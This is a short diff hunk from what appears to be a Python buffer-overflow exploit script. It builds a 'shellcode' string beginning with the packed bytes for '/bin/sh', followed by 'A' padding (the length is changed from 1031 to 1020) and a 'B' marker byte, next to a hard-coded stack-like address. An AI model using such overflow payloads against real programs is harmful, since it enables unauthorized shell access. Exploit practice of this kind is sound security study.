@@ -18,7 +18,7 @@ d3 = 0x7ffffffffe100
 
 shellcode = struct.pack('<q', 0x0068732f6e69622f) #?
 
-shellcode += 'A'*(1031)
+shellcode += 'A'*(1020)
 shellcode += 'B'
 
 
